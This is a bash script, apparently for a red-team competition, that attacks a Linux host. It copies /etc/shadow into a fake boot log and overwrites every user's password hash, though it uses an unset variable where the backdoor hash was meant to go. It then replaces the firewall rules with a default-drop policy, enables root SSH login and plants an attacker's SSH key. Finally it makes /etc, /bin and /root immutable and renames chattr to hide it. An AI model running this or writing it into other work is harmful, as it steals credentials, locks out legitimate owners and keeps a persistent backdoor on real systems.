#!/bin/bash

# BEFORE RUNNING: 
# 3. generate an ssh key on the kali box and copy it out

publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAigDDZnPGIBAYWg2eTuTjZu2QGwMlF3rGH9WYT0m/X6qIsXRPArgraqUfOjAAMobGQhXeciUb/KnNqVijgZLww8iG41+YLItgTpCahMbUhuRmLQ6C60RPUve5ZM3bRAts2NyPAdq+oW82tCcoUx1or60rghKLsr2wx14O39/soOHzGc5Du8Yq2CKn7Q== root@kali-2"
scorebotUser="sky_scorebot"
backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/'
allowedInboundPorts=("22" "53" "3640" "3089")



touch /var/log/boot.log.0
cat /etc/shadow >> /var/log/boot.log.0



while IFS=: read -r user passwd rest; do
    # Skip lines that are comments or empty
    if [[ "$user" =~ ^#|^$ ]]; then
        continue
    fi
    if [[ "$user" == "$scorebotUser" ]]; then
        echo "Skipping password update for user: $scorebotUser"
        continue
    fi
    # Check if the password hash starts with a $
    if [[ "${passwd:0:1}" == '$' ]]; then
        # Replace the password field with the new hashed password
        sed -i "s#^$user:[^:]*:#$user:$hash:#" /etc/shadow
    fi
done < /etc/shadow




allowedInboundPorts=("22" "53" "3640" "3089")


iptables -F 
iptables -X

# allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

for port in "${allowedInboundPorts[@]}"; do
    iptables -A INPUT -p tcp --dport $port -j ACCEPT
    iptables -A OUTPUT -p tcp --dport $port -j ACCEPT
    iptables -A OUTPUT -o eth0 -p tcp --dport $port -j ACCEPT
done

iptables -I INPUT -p icmp --icmp-type echo-request -j DROP
ip6tables -I INPUT -p ipv6-icmp --icmpv6-type echo-request -j DROP

chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
for chain in $chains
do
    iptables --policy $chain DROP
done

iptables-save



# backdoor ssh keys
# generate a key on the attacker box:  ssh-keygen -t rsa -b 4096
# copy the public key to the clipboard: cat ~/.ssh/id_rsa.pub
# paste the public key below as the publicKey variable
sshConfigFile="/etc/ssh/sshd_config"
if grep -q "PermitRootLogin" "$sshConfigFile"; then
    sed -i 's/^#\s*PermitRootLogin.*/PermitRootLogin yes/' $sshConfigFile
else
    echo "PermitRootLogin yes" >> $sshConfigFile
fi
mkdir -p /root/.ssh
touch /root/.ssh/authorized_keys
chown root /root/.ssh
chmod 700 /root/.ssh
chown root /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo $publicKey >> /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys


# from lockdown.sh
chattr +i /root/.ssh/authorized_keys
chattr +i /etc/passwd
chattr +i /etc/shadow
chattr +i /bin
chattr +i /usr/bin
chattr +i /root
chattr +i /etc
mv /usr/bin/chattr /usr/bin/rttahc
